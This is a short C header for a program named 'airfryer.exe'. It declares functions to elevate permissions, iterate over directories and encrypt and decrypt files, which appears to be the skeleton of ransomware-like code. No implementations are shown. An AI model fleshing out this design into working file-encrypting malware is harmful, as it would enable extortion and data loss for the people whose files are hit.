#ifndef __AIRF_H__
#define __AIRF_H__

#define THISNAME "airfryer.exe"
#define ASCII_LIM 255
#define DEGREE 2

extern void elevate_perms(void);
extern void iterate_dir(char *operation, char *execpath);
extern void fencrypt(char *fname);
extern void fdecrypt(char *fname); 

#endif //__AIRF_H__
